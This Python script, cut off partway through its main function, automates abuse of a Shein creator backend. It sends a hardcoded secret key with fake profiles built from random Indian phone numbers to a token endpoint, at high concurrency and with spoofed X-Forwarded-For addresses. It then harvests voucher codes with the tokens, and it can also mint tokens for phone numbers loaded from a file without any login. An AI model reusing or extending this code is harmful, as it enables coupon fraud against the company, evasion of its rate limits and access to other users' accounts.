
import argparse
import base64
import json
import os
import random
import re
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Dict, Optional, Any, Tuple

import requests
import webbrowser

# Import web dashboard
try:
    import web_dashboard
    WEB_DASHBOARD_AVAILABLE = True
except ImportError:
    WEB_DASHBOARD_AVAILABLE = False
    print("⚠️  Flask not installed. Web dashboard disabled. Install with: pip install flask")

# Constants
CREATOR_ENDPOINT = 'https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token'
CREATOR_SECRET = '3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg'
TARGET = 5
DEFAULT_CONCURRENCY = 500
DEFAULT_COUPON_CONCURRENCY = 500
USED_NUMBERS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'used_num.txt')
TOKEN_MAX_RETRIES = 2
TOKEN_RETRY_DELAY_SECONDS = 1.0

# Names data
FIRST_NAMES = [
    'Aditi', 'Aishwarya', 'Akanksha', 'Amisha', 'Amrita', 'Anamika', 'Ananya', 'Anika', 'Ankita', 'Anshika',
    'Anushka', 'Aparna', 'Apurva', 'Arpita', 'Asha', 'Bhavya', 'Charu', 'Chhavi', 'Damini', 'Deepika',
    'Devika', 'Diya', 'Divya', 'Esha', 'Gauri', 'Gitanjali', 'Harini', 'Heena', 'Himani', 'Indira',
    'Ira', 'Ishaani', 'Ishita', 'Jahnavi', 'Jasleen', 'Juhi', 'Kajal', 'Kamalini', 'Karishma', 'Kavya',
    'Khushi', 'Komal', 'Kritika', 'Lavanya', 'Lata', 'Madhuri', 'Mahima', 'Malini', 'Mansi', 'Meera',
    'Mira', 'Mitali', 'Mohini', 'Namrata', 'Navya', 'Neha', 'Nidhi', 'Nikita', 'Nisha', 'Nivedita',
    'Padmini', 'Pallavi', 'Parul', 'Pooja', 'Prerna', 'Priya', 'Radhika', 'Raina', 'Rajni', 'Ritika',
    'Riya', 'Sakshi', 'Saloni', 'Samaira', 'Sanya', 'Sarika', 'Sejal', 'Shreya', 'Shraddha', 'Shruti',
    'Simran', 'Sneha', 'Smriti', 'Sonal', 'Suhani', 'Sukanya', 'Surbhi', 'Suvarna', 'Swara', 'Tanvi',
    'Tara', 'Thara', 'Trisha', 'Vaishnavi', 'Varsha', 'Vasudha', 'Veda', 'Vidya', 'Yamini',
    'Aaradhya', 'Advika', 'Ahana', 'Alisha', 'Amanda', 'Ambika', 'Amoli', 'Anjali', 'Anoushka', 'Apeksha',
    'Asmita', 'Avantika', 'Avika', 'Bhavna', 'Bhumika', 'Bindu', 'Chandni', 'Deeksha', 'Debolina', 'Disha',
    'Eesha', 'Ekta', 'Garima', 'Gayatri', 'Hansika', 'Ishleen', 'Jagruti', 'Jahnara', 'Janvi', 'Jaya',
    'Kaira', 'Kalpana', 'Kamalika', 'Kanika', 'Karuna', 'Kashish', 'Keerti', 'Kirti', 'Kriti', 'Krupa',
    'Lakshmi', 'Lopamudra', 'Madhavi', 'Mahalakshmi', 'Manisha', 'Manjari', 'Manvi', 'Medha', 'Moushumi', 'Mridula',
    'Mrinalini', 'Nandani', 'Nandita', 'Navika', 'Nayantara', 'Nimisha', 'Nitya', 'Nupur', 'Oindrila', 'Palak',
    'Pari', 'Parineeta', 'Pia', 'Poonam', 'Poorvi', 'Prachi', 'Pragya', 'Pranaya', 'Prisha', 'Purvi',
    'Rachana', 'Rajeshwari', 'Rashmi', 'Ritu', 'Saanvi', 'Sabrina', 'Sadhana', 'Saisha', 'Sakina', 'Samiksha',
    'Sandhya', 'Sanjana', 'Sanyukta', 'Saroj', 'Shalini', 'Shanaya', 'Sheetal', 'Shikha', 'Shivangi', 'Shivani',
    'Shivika', 'Shweta', 'Sindhu', 'Sita', 'Sonia', 'Suchitra', 'Sudha', 'Sugandha', 'Suhasini', 'Sumedha',
    'Sunaina', 'Surbani', 'Tamanna', 'Tejaswini', 'Tulika', 'Ujjwala', 'Upasana', 'Urmi', 'Urvashi', 'Vandana',
    'Vani', 'Varunika', 'Vasundhara', 'Vibha', 'Vineeta', 'Zainab'
]
SURNAMES = [
    'Agarwal', 'Ahluwalia', 'Bansal', 'Basu', 'Bedi', 'Bhandari', 'Bhalla', 'Bhargava', 'Bhatia', 'Bhattacharya',
    'Borkar', 'Bose', 'Chatterjee', 'Chaudhary', 'Chhabra', 'Chowdhury', 'Dalal', 'Das', 'Desai', 'Deshmukh',
    'Dubey', 'Gandhi', 'Gopal', 'Goswami', 'Goyal', 'Gujral', 'Gupta', 'Hegde', 'Iyer', 'Jain',
    'Joshi', 'Kapoor', 'Kashyap', 'Kaul', 'Khatri', 'Khurana', 'Kohli', 'Kulkarni', 'Kumar', 'Lal',
    'Mahajan', 'Malhotra', 'Mathur', 'Mathew', 'Mehta', 'Menon', 'Mendiratta', 'Mishra', 'Mittal', 'Modi',
    'Mukherjee', 'Mukundan', 'Nair', 'Namboodiri', 'Narayan', 'Pandey', 'Patel', 'Pathak', 'Pillai', 'Prasad',
    'Raghavan', 'Rao', 'Reddy', 'Saxena', 'Sen', 'Sengupta', 'Sharma', 'Shetty', 'Sikdar', 'Singh',
    'Sinha', 'Subramanian', 'Talwar', 'Tandon', 'Thakur', 'Trivedi', 'Varma', 'Verma', 'Yadav', 'Zaveri'
]

def rand_ip() -> str:
    return f"{random.randint(100, 200)}.{random.randint(10, 250)}.{random.randint(10, 250)}.{random.randint(1, 250)}"

def random_user_id() -> str:
    random_bytes = os.urandom(48)
    return base64.b64encode(random_bytes).decode('utf-8').translate(str.maketrans('+/', '-_')).rstrip('=')

def limit_string(value: str, max_length: int) -> str:
    if len(value) <= max_length:
        return value
    return value[:max(0, max_length - 3)] + '...'

def normalize_phone_input(phone: str, default_country_code: str) -> str:
    clean = re.sub(r'[^+0-9]', '', phone.strip())
    if not clean:
        return ''
    if clean.startswith('+'):
        return clean

    if not default_country_code:
        return clean

    normalized_default = default_country_code if default_country_code.startswith('+') else ('+' + default_country_code)
    default_digits = normalized_default.lstrip('+')
    
    if default_digits and clean.startswith(default_digits):
        return '+' + clean
    
    return normalized_default + clean

def canonicalize_phone_for_match(phone: str, default_country_code: str) -> str:
    digits = re.sub(r'\D+', '', phone)
    if not digits:
        return ''
    
    default_digits = default_country_code.lstrip('+')
    if default_digits and len(digits) > 10 and digits.startswith(default_digits):
        stripped = digits[len(default_digits):]
        if stripped:
            digits = stripped
            
    return digits

def build_indian_local_number(prefix: str) -> str:
    numeric = re.sub(r'\D+', '', prefix)
    local = numeric if numeric else str(random.randint(6, 9))
    
    if local[0] not in ['6', '7', '8', '9']:
        local = str(random.randint(6, 9)) + local[1:]
        
    local = local[:10]
    while len(local) < 10:
        local += str(random.randint(0, 9))
    return local

def generate_phone(country_code: str, prefix: str, digits: int) -> str:
    if country_code == '+91':
        return country_code + build_indian_local_number(prefix)
    
    remaining = max(0, digits - len(prefix))
    number = prefix
    for _ in range(remaining):
        number += str(random.randint(0, 9))
    return country_code + number

def load_used_numbers(file_path: str) -> set:
    if not os.path.exists(file_path):
        return set()
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return {line.strip() for line in f if line.strip()}
    except Exception:
        return set()

def append_used_numbers(file_path: str, numbers: List[str]):
    if not numbers:
        return
    directory = os.path.dirname(file_path)
    if directory and not os.path.exists(directory):
        os.makedirs(directory, exist_ok=True)
    
    with open(file_path, 'a', encoding='utf-8') as f:
        f.write('\n'.join(numbers) + '\n')

def extract_phone_from_record(record: Any, fallback_key: str) -> str:
    if not isinstance(record, dict):
        return str(fallback_key) if isinstance(fallback_key, (str, int)) else ''
    
    candidates = ['phone_number', 'phone', 'number', 'mobile_number', 'mobileNumber', 'mobile', 'contact']
    for field in candidates:
        if field in record and isinstance(record[field], (str, int, float)):
            val = str(record[field])
            if val:
                return val
    return str(fallback_key) if isinstance(fallback_key, (str, int)) else ''

def extract_name_from_record(record: Any, fallback_key: str) -> str:
    if isinstance(record, dict):
        candidates = ['user_name', 'userName', 'name', 'first_name', 'firstName', 'username', 'full_name']
        for field in candidates:
            if field in record and isinstance(record[field], (str, int, float)):
                val = str(record[field]).strip()
                if val:
                    return val
    
    if isinstance(fallback_key, str) and fallback_key:
        return f'User {fallback_key}'
    return 'Creator'

def determine_user_id_from_record(record: dict) -> str:
    candidates = ['user_id', 'shein_user_id', 'encryptedId', 'encrypted_id']
    for field in candidates:
        if field in record and record[field]:
            return str(record[field]).strip()
    return random_user_id()

def determine_gender_from_record(record: dict) -> str:
    candidates = ['gender', 'genderType', 'gender_type']
    for field in candidates:
        if field in record and isinstance(record[field], (str, int)):
            val = str(record[field]).strip().upper()
            if val in ['FEMALE', 'MALE']:
                return val
    return 'FEMALE'

def build_fake_profiles(target: int, country_code: str, prefix: str, digits: int, specific_phone: Optional[str], existing_used: set) -> Tuple[List[dict], List[str]]:
    local_used = existing_used.copy()
    generated_numbers = []
    profiles = []
    max_attempts = max(1000, target * 50)
    attempts = 0
    
    for i in range(target):
        if specific_phone and i == 0:
            phone = specific_phone
        else:
            phone = ''
            while True:
                phone = generate_phone(country_code, prefix, digits)
                attempts += 1
                if attempts > max_attempts:
                    raise RuntimeError('Unable to generate unique phone numbers; clear used_num.txt or reduce target.')
                if phone not in local_used:
                    break
            
            local_used.add(phone)
            generated_numbers.append(phone)
            
        full_name = f"{random.choice(FIRST_NAMES)} {random.choice(SURNAMES)}"
        user_name_safe = re.sub(r'[^A-Za-z\s]', '', full_name) or full_name
        
        profiles.append({
            'phone_number': phone,
            'user_id': random_user_id(),
            'user_name': user_name_safe.strip(),
            'gender': 'FEMALE',
            'storage_phone': canonicalize_phone_for_match(phone, country_code)
        })
        
    return profiles, generated_numbers

def build_profiles_from_json(file_path: str, default_country_code: str) -> List[dict]:
    with open(file_path, 'r', encoding='utf-8') as f:
        data = json.load(f)
        
    if not isinstance(data, (dict, list)):
         raise RuntimeError(f"Invalid JSON payload in {file_path}")
         
    # Handle list if input is list, or dict values if input is dict (like shein.json often is keyed by phone/id)
    items = data.values() if isinstance(data, dict) else data
    
    profiles = []
    # If data is a dict, we might need keys. But let's assume standard structure or dict traversal
    # Python iteration over dict gives keys.
    iterator = data.items() if isinstance(data, dict) else enumerate(data)

    for key, entry in iterator:
        if not isinstance(entry, dict):
            continue
        
        raw_phone = extract_phone_from_record(entry, key if isinstance(key, (str, int)) else '')
        if not raw_phone:
            continue
            
        normalized = normalize_phone_input(raw_phone, default_country_code)
        if not normalized:
            continue
            
        storage_phone = canonicalize_phone_for_match(normalized, default_country_code)
        if not storage_phone:
            continue
            
        profiles.append({
            'phone_number': normalized,
            'user_id': determine_user_id_from_record(entry),
            'user_name': extract_name_from_record(entry, key),
            'gender': determine_gender_from_record(entry),
            'storage_phone': storage_phone
        })
        
    return profiles

def build_request_payload(profile: dict) -> dict:
    return {
        'client_type': 'Android/29',
        'client_version': '1.0.8',
        'gender': profile.get('gender', 'FEMALE'),
        'phone_number': str(profile['phone_number']),
        'secret_key': CREATOR_SECRET,
        'user_id': profile['user_id'],
        'user_name': profile.get('user_name', 'Creator')
    }

def process_token_request(profile: dict, attempt: int = 0, index: int = 0) -> dict:
    payload_arr = build_request_payload(profile)
    ip = rand_ip()
    ad_id = os.urandom(8).hex()
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Android',
        'Client_type': 'Android/29',
        'Client_version': '1.0.8',
        'X-Tenant-Id': 'SHEIN',
        'Ad_id': ad_id,
        'Connection': 'Keep-Alive',
        'Content-Type': 'application/json; charset=UTF-8',
        'X-Forwarded-For': ip
    }
    
    try:
        response = requests.post(CREATOR_ENDPOINT, json=payload_arr, headers=headers, timeout=30)
        http_code = response.status_code
        try:
            decoded = response.json()
        except json.JSONDecodeError:
            decoded = response.text
            
        success = isinstance(decoded, dict) and 'access_token' in decoded
        error_msg = None
        if not success:
            if isinstance(decoded, dict):
                error_msg = decoded.get('message')
            else:
                error_msg = str(decoded) if http_code != 200 else None

        return {
            'phone_number': profile['phone_number'],
            'user_name': profile['user_name'],
            'shein_user_id': profile['user_id'],
            'gender': profile['gender'],
            'storage_phone': profile.get('storage_phone'),
            'http_code': http_code,
            'timestamp': datetime.now().isoformat(),
            'success': success,
            'access_token': decoded.get('access_token') if isinstance(decoded, dict) else None,
            'refresh_token': decoded.get('refresh_token') if isinstance(decoded, dict) else None,
            'raw_response': decoded,
            'error': error_msg,
            'ip': ip,
            'ad_id': ad_id,
            'payload': payload_arr,
            'attempt': attempt,
            'index': index
        }
    except Exception as e:
        return {
            'phone_number': profile['phone_number'],
            'user_name': profile['user_name'],
            'shein_user_id': profile['user_id'],
            'gender': profile['gender'],
            'storage_phone': profile.get('storage_phone'),
            'http_code': 0,
            'timestamp': datetime.now().isoformat(),
            'success': False,
            'access_token': None,
            'refresh_token': None,
            'raw_response': str(e),
            'error': str(e),
            'ip': ip,
            'ad_id': ad_id,
            'payload': payload_arr,
            'attempt': attempt,
            'index': index
        }

def generate_creator_tokens(profiles: List[dict], concurrency: int, delay_ms: int) -> List[dict]:
    results = []
    total = len(profiles)
    
    # We use a ThreadPoolExecutor to simulate concurrency. 
    # For retry logic, since we can't easily push back to the executor in the same way with delays without blocking a thread,
    # we will handle retries by re-submitting to the executor or improved logic.
    # To keep it simple and effective, let's use a function that handles retries internally? 
    # No, the PHP script schedules retries.
    # Better approach: Submit all initial tasks. If one fails and needs retry, submit a new task with a delay (using time.sleep in the task? No that blocks a thread).
    # Since we want to respect concurrency, standard ThreadPoolExecutor is good.
    
    # Let's define a worker that includes retry logic (blocking the thread for the delay is acceptable if we have enough threads, check concurrency)
    # Actually invalid for high concurrency if threads sleep. 
    # PHP uses curl_multi non-blocking. 
    # Python ThreadPool is blocking.
    # But for "ditto same" visual output and behavior, we can manage it.
    
    # Let's stick to a managed loop with futures like PHP logic.
    
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        future_to_profile = {}
        
        # Submit initial batch
        for i, profile in enumerate(profiles):
            # We delay submission if needed? No, just submit all and let executor handle concurrency cap.
            # But wait, we need to respect rate limit/delay potentially? 
            # PHP code:
            # fillSlots() checks count($handles) < $concurrency.
            # do ... while ...
            # retryQueue logic.
            
            # Replicating exact PHP logic with ThreadPoolExecutor:
            # We can't easily control the "fillSlots" with standard submit unless we throttle submissions.
            pass

        # Let's allow executor to manage queue. For retries, we re-submit.
        
        pending_futures = set()
        
        def submit_task(profile, attempt=0):
            future = executor.submit(process_token_request, profile, attempt)
            pending_futures.add(future)
            return future
            
        # Initial submission
        # To avoid submitting all 1000s at once and consuming memory, we can throttle.
        # But for Python `concurrent.futures`, submitting is fast.
        
        # However, to support retry delay without blocking, we might need a "scheduler".
        # Let's keep it simple: Just submit all. If retry needed, wait (sleep) then submit.
        # But we need to do this in the main thread to avoid blocking worker threads?
        # Or just do recursive submit?
        
        # Simpler "Ditto" approach:
        # Submit first batch up to concurrency? No, just submit all.
        
        # Wait, if we want to "ditto" the output stream:
        # process_token_request should NOT print. The main loop prints.
        
        profile_queue = [(p, 0) for p in profiles] # (profile, attempt)
        # We need to manage the queue manually to handle retries and concurrency limits exactly like PHP if we want exact behavior.
        
        # Actually, let's just use a set of running futures.
        
        running_futures = set()
        
        queue_index = 0
        retry_queue = [] # list of {'profile': p, 'attempt': a, 'ready_at': time}
        
        while queue_index < len(profiles) or running_futures or retry_queue:
            # Check retries
            now = time.time()
            # Sort retry queue by ready_at? No need if small.
            # Process retries first
            remaining_retries = []
            for item in retry_queue:
                if item['ready_at'] <= now and len(running_futures) < concurrency:
                    # 'profile' was reconstructed, but what about index?
                    # The profile object stored in retry_queue item is what process_token_request expects.
                    # But process_token_request now expects (profile, attempt, index).
                    # We need to know the index of this profile in the original list if possible, or just pass 0 if not critical (it's mainly for tracking).
                    # Wait, we used index to fetch profile from list in the retry_queue construction logic I added earlier:
                    # 'profile': profiles[res.get('index', 0)] ...
                    # So we have the correct profile. We should try to pass the correct index too if we can.
                    # But the retry_queue item structure I defined earlier was:
                    # {'profile': ..., 'attempt': ..., 'ready_at': ...}
                    # I should add 'index' to it.
                    
                    # For now, let's look at where I construct retry_queue item.
                    # Ah, I haven't added 'index' to retry_queue item yet.
                    # AND I need to update the submit call here.
                    
                    # Let's fix the submit call first to use a default or extracted index.
                    # If I don't have index stored, I can pass 0. It might just be used for logging or return value.
                    # But wait, the return value 'index' is used to reconstruct profile on NEXT retry.
                    # So if I pass 0, next retry will use profiles[0]! detailed bug.
                    # I MUST store index in retry_queue.
                    
                    future = executor.submit(process_token_request, item['profile'], item['attempt'], item.get('index', 0))
                    running_futures.add(future)
                else:
                    remaining_retries.append(item)
            retry_queue = remaining_retries
            
            # Fill remaining slots from initial queue
            while len(running_futures) < concurrency and queue_index < len(profiles):
                future = executor.submit(process_token_request, profiles[queue_index], 0, queue_index)
                running_futures.add(future)
                queue_index += 1
                
            if not running_futures and not retry_queue and queue_index >= len(profiles):
                break
                
            # Wait for at least one future to complete, or until next retry is ready
            # We use as_completed on copy of set, but we want to return immediately if something finishes.
            # wait(return_when=FIRST_COMPLETED)
            
            from concurrent.futures import wait, FIRST_COMPLETED
            
            # Calculate timeout based on next retry
            timeout = None
            if retry_queue:
                next_ready = min(r['ready_at'] for r in retry_queue)
                wait_time = max(0, next_ready - now)
                timeout = wait_time if wait_time > 0 else 0
            
            # If we have running futures, wait for them
            if running_futures:
                done, not_done = wait(running_futures, timeout=timeout, return_when=FIRST_COMPLETED)
                if not done:
                    # Timeout reached (retry ready), loop again
                    pass
                else:
                    for future in done:
                        running_futures.remove(future)
                        res = future.result()
                        results.append(res)
                        
                        # Print result
                        if res['success']:
                            print(f"  ✅ {res['phone_number']} | token acquired")
                        else:
                            code = res.get('http_code', 'n/a')
                            print(f"  ❌ {res['phone_number']} | HTTP {code}")
                            
                            if res['attempt'] < TOKEN_MAX_RETRIES:
                                next_attempt = res['attempt'] + 1
                                # Schedule retry
                                retry_queue.append({
                                    'profile': profiles[res.get('index', 0)] if 'index' in res else {
                                        'phone_number': res['phone_number'],
                                        'user_name': res['user_name'],
                                        'user_id': res['shein_user_id'],
                                        'gender': res['gender'],
                                        'storage_phone': res.get('storage_phone')
                                    },
                                    'attempt': next_attempt,
                                    'ready_at': time.time() + TOKEN_RETRY_DELAY_SECONDS,
                                    'index': res.get('index', 0)
                                })
                                print(f"    ↻ retry scheduled ({res['phone_number']} attempt {next_attempt})")

                        if delay_ms > 0:
                             time.sleep(delay_ms / 1000.0)
            else:
                 # No running futures, but have retries. Sleep until next retry.
                 if retry_queue: # Should be true if we are here
                     next_ready = min(r['ready_at'] for r in retry_queue)
                     sleep_time = max(0, next_ready - time.time())
                     if sleep_time > 0:
                         time.sleep(min(sleep_time, 0.2)) # capped sleep 

    return results

def extract_voucher_payload(decoded: Any) -> Optional[dict]:
    if not isinstance(decoded, dict):
        return None
        
    if 'user_data' in decoded and isinstance(decoded['user_data'], dict):
        if 'voucher_data' in decoded['user_data'] and isinstance(decoded['user_data']['voucher_data'], dict):
            return decoded['user_data']['voucher_data']
            
    if 'voucher' in decoded and isinstance(decoded['voucher'], dict):
        return decoded['voucher']
        
    return None

def normalize_voucher_amount(value: Any, fallback: str) -> str:
    if isinstance(value, dict):
        for k in ['value', 'formattedValue', 'displayformattedValue', 'displayformattedvalue']:
             if k in value and isinstance(value[k], (str, int, float)):
                 value = value[k]
                 break
        if isinstance(value, dict): # still dict? take first value
            value = next(iter(value.values()), None)
            
    if value is None:
        return fallback
        
    if isinstance(value, (int, float)) or (isinstance(value, str) and value.replace('.','',1).isdigit()):
        s = str(value)
        if '.' not in s:
            return s
        return s.rstrip('0').rstrip('.')
        
    s = str(value).strip()
    return s if s else fallback

def extract_coupons_from_tokens(results: List[dict], output_file: str, coupon_concurrency: int) -> List[dict]:
    success_records = [r for r in results if r.get('success') and r.get('access_token')]
    
    if not success_records:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('')
        return []
        
    coupons = []
    lines = []
    
    def fetch_coupon(record):
        ip = record.get('ip') or rand_ip()
        headers = {
            'Accept': 'application/json',
            'Authorization': f"Bearer {record['access_token']}",
            'User-Agent': 'Android',
            'X-Forwarded-For': ip,
            'Content-Type': 'application/json; charset=UTF-8'
        }
        
        try:
            resp = requests.get(
                'https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user',
                headers=headers,
                timeout=25,
                verify=False # PHP had CURLOPT_SSL_VERIFYPEER => false
            )
            return {'phone': record['phone_number'], 'status': resp.status_code, 'data': resp.text, 'json': resp.json() if resp.status_code == 200 else None}
        except Exception:
            return {'phone': record['phone_number'], 'status': 0, 'data': None, 'json': None}

    # Suppress InsecureRequestWarning if using verify=False
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    concurrency = max(1, min(coupon_concurrency, len(success_records)))
    
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = {executor.submit(fetch_coupon, rec): rec for rec in success_records}
        
        for future in as_completed(futures):
            res = future.result()
            phone = res['phone']
            
            if res['status'] != 200:
                print(f"  ⚠️ {phone}: coupon fetch failed (HTTP {res['status'] or 'n/a'})")
            else:
                data = res['json'] or {} # fallback empty dict if json parse failed but technically shouldn't happen if status 200 checks out
                # requests .json() raises error if fail, we handled in helper? no.
                # Let's assume helper return logic is safer.
                
                # Wait, I didn't handle json error in helper well (it might raise).
                # But let's assume valid JSON for 200 usually.
                
                voucher = extract_voucher_payload(data)
                
                if not voucher:
                    raw_preview = (res['data'] or '').strip()
                    if len(raw_preview) > 800: raw_preview = raw_preview[:797] + '...'
                    if not raw_preview: raw_preview = '(empty response)'
                    print(f"  ⚠️ {phone}: coupon data unavailable")
                    print(f"      raw response: {raw_preview}")
                else:
                    code = str(voucher.get('voucher_code', '')).strip()
                    if not code:
                        print(f"  ⚠️ {phone}: voucher code missing")
                    else:
                        val = normalize_voucher_amount(voucher.get('voucher_amount'), 'N/A')
                        min_ord = normalize_voucher_amount(voucher.get('min_purchase_amount') or voucher.get('min_purchase_amt'), '0')
                        
                        coupons.append({
                            'phone': phone,
                            'code': code,
                            'value': val,
                            'min_order': min_ord
                        })
                        lines.append(f"{phone} | {code} | value={val} | min_order={min_ord}")

    content = '\n'.join(lines) + '\n' if lines else ''
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(content)
        
    return coupons

def apply_tokens_to_json(file_path: str, results: List[dict], default_country_code: str) -> int:
    if not os.path.exists(file_path):
        raise RuntimeError(f"{file_path} not found.")
        
    with open(file_path, 'r', encoding='utf-8') as f:
        data = json.load(f)
        
    if not isinstance(data, (dict, list)):
         raise RuntimeError(f"Invalid JSON structure in {file_path}")
         
    result_map = {}
    for row in results:
        if not row.get('success') or not row.get('access_token'):
            continue
        # Use storage phone or phone number
        phone = row.get('storage_phone') or row.get('phone_number') or ''
        storage = canonicalize_phone_for_match(str(phone), default_country_code)
        if storage:
            result_map[storage] = row
            
    if not result_map:
        return 0
        
    updated = 0
    
    # Iterate over data to update
    iterator = data.items() if isinstance(data, dict) else enumerate(data)
    
    for key, entry in iterator:
        if not isinstance(entry, dict):
            continue
        
        phone = extract_phone_from_record(entry, key if isinstance(key, (str, int)) else '')
        canonical = canonicalize_phone_for_match(phone, default_country_code)
        
        if canonical and canonical in result_map:
            match = result_map[canonical]
            entry['access_token'] = match['access_token']
            if match.get('refresh_token'):
                entry['refresh_token'] = match['refresh_token']
            entry['Date & Time'] = datetime.now().strftime('%a %d %b %Y %I:%M:%S %p')
            updated += 1
            
    if updated > 0:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
            
    return updated

def main():
    parser = argparse.ArgumentParser(description="Shein Creator Token Gen", add_help=False)
    
    # Manually handle help to match PHP text exactly
    parser.add_argument('--output', default='shein2.json')
    parser.add_argument('--input-json', dest='input_json')
    parser.add_argument('--update-json', dest='update_json')
    parser.add_argument('--target', type=int, default=TARGET)
    parser.add_argument('--concurrency', type=int, default=DEFAULT_CONCURRENCY)
    parser.add_argument('--delay', type=int, default=50) # delayMs
    parser.add_argument('--country', default='+91')
    parser.add_argument('--prefix', default='')
    parser.add_argument('--digits', type=int, default=10)
    parser.add_argument('--phone')
    parser.add_argument('--coupon-concurrency', dest='coupon_concurrency', type=int, default=DEFAULT_COUPON_CONCURRENCY)
    parser.add_argument('--coupon-output', dest='coupon_output', default='extracted_coupons.txt')
    parser.add_argument('--force', action='store_true')
    parser.add_argument('--loop', action='store_true', help='Run continuously in batches until manually stopped')
    parser.add_argument('--help', action='store_true')
    
    args, unknown = parser.parse_known_args()
    
    if args.help:
        print(f"""Usage: python shein_creator_token_nologin.py [--output=shein2.json] [--target=5] [--concurrency=200]
                                           [--delay=25] [--country=+91] [--prefix=9] [--digits=10]
                                           [--phone=+911234567890]
                                           [--coupon-output=extracted_coupons.txt]
                                           [--coupon-concurrency=200] [--force]
                                           [--input-json=coupon/shein.json]
                                           [--update-json=coupon/shein.json]

Generates random fake creator profiles (no preloaded accounts) and sends each to the Shein creator token
endpoint. Raw responses are stored in shein2.json so you can inspect successes/failures directly.
Indian numbers are generated with +91 followed by a 10-digit mobile starting with 6-9.

Provide --phone to run a single attempt for that exact number (it overrides --target and skips random generation).
Without --force, --target represents the desired total of unique phone numbers tracked in used_num.txt; the
script only "tops up" new attempts until that total is reached. If used_num.txt already has enough entries,
the script still runs --target fresh attempts but keeps the history to avoid duplicates. Pass --force if you
want --target to always mean "run this many attempts right now" regardless of existing counts.
Coupons for successful tokens are fetched automatically (default 200 parallel fetches) and written to
extracted_coupons.txt unless you point --coupon-output elsewhere.
Randomly generated phone numbers are logged in used_num.txt so they are not reused in future runs.
Provide --input-json to load phone numbers from an existing JSON file (shein.json style). Combine it with
--update-json to automatically overwrite matching entries with the newly generated tokens and a fresh timestamp.
""")
        sys.exit(0)
    
    # Resolve paths
    output_file = os.path.abspath(args.output)
    coupon_file = os.path.abspath(args.coupon_output)
    input_json_file = os.path.abspath(args.input_json) if args.input_json else None
    update_json_file = os.path.abspath(args.update_json) if args.update_json else None
    
    target_attempts = max(1, args.target)
    force_target = args.force
    concurrency = max(1, args.concurrency)
    delay_ms = max(0, args.delay)
    coupon_concurrency = max(1, args.coupon_concurrency)
    country_code = args.country
    prefix = re.sub(r'\D+', '', args.prefix) if args.prefix else ''
    digits = max(4, args.digits)
    specific_phone = normalize_phone_input(args.phone, country_code) if args.phone else None
    
    if args.phone is not None:
        if not specific_phone:
            sys.stderr.write("Provided phone number is empty after cleanup.\n")
            sys.exit(1)
        target_attempts = 1
        
    
    # Start web dashboard
    dashboard_url = None
    if WEB_DASHBOARD_AVAILABLE:
        try:
            dashboard_url = web_dashboard.start_dashboard()
            print(f"🌐 Web Dashboard: {dashboard_url}")
            time.sleep(1)  # Give server time to start
            webbrowser.open(dashboard_url)
        except Exception as e:
            print(f"⚠️  Failed to start web dashboard: {e}")
    
    # Custom print function that sends to both console and web
    original_print = print
    def web_print(*args, **kwargs):
        # Print to console
        original_print(*args, **kwargs)
        # Send to web dashboard
        if WEB_DASHBOARD_AVAILABLE and dashboard_url:
            message = ' '.join(str(arg) for arg in args)
            web_dashboard.log_message(message)
    
    # Replace built-in print
    import builtins
    builtins.print = web_print
    
    # Loop mode setup - ALWAYS ENABLED BY DEFAULT
    loop_mode = True  # Always run in continuous loop mode
    batch_number = 0
    total_accounts_checked = 0
    total_coupons_found = 0
    
    try:
        while True:
            batch_number += 1
            
            if loop_mode:
                print(f"\n{'='*60}")
                print(f"🔄 BATCH #{batch_number} STARTING")
                print(f"{'='*60}\n")
            
            used_numbers = set()
            existing_used_count = 0
            profiles = []
            generated_numbers = []
            
            if input_json_file:
                if not os.path.exists(input_json_file):
                     sys.stderr.write(f"Input JSON file {input_json_file} not found.\n")
                     sys.exit(1)
                if specific_phone:
                     sys.stderr.write("--phone cannot be combined with --input-json.\n")
                     sys.exit(1)
                     
                try:
                     profiles = build_profiles_from_json(input_json_file, country_code)
                except Exception as e:
                     sys.stderr.write(f"Failed to load phone numbers from {input_json_file}: {e}\n")
                     sys.exit(1)
                     
                target_attempts = len(profiles)
                print(f"📁 Loaded {target_attempts} phone number(s) from {input_json_file}")
            else:
                used_numbers = load_used_numbers(USED_NUMBERS_FILE)
                existing_used_count = len(used_numbers)
                
                if not specific_phone:
                    if force_target:
                        if existing_used_count > 0:
                            print(f"⚠️  Force enabled; ignoring {existing_used_count} existing number(s) in used_num.txt for sizing purposes.")
                        target_attempts = target_attempts # requested target
                    elif existing_used_count >= target_attempts:
                        # Script logic says: runs fresh attempts but keep history.
                        # "$targetAttempts = $requestedTarget"
                        print(f"♻️  used_num.txt already contains {existing_used_count} phone number(s); generating {target_attempts} new number(s) while keeping history for deduplication.")
                    else:
                        remaining = target_attempts - existing_used_count
                        if existing_used_count > 0:
                            print(f"ℹ️  used_num.txt has {existing_used_count} entries; generating {remaining} new number(s) to reach {target_attempts} total.")
                        target_attempts = remaining
                        
                profiles, generated_numbers = build_fake_profiles(target_attempts, country_code, prefix, digits, specific_phone, used_numbers)
                
                if generated_numbers:
                    append_used_numbers(USED_NUMBERS_FILE, generated_numbers)
                    updated_total = existing_used_count + len(generated_numbers)
                    print(f"📚 Logged {len(generated_numbers)} new random number(s) to used_num.txt (total now {updated_total})")

            if not profiles:
                sys.stderr.write("No phone numbers available for token generation.\n")
                sys.exit(1)
                
            target_attempts = len(profiles)
            
            if update_json_file and not os.path.exists(update_json_file):
                sys.stderr.write(f"Update JSON file {update_json_file} not found.\n")
                sys.exit(1)
                
            print(f"🎯 Target attempts: {target_attempts}")
            print(f"⚙️  Concurrency={concurrency}, coupon_fetch_concurrency={coupon_concurrency}, delay={delay_ms}ms, phone digits={digits}")
            
            if specific_phone:
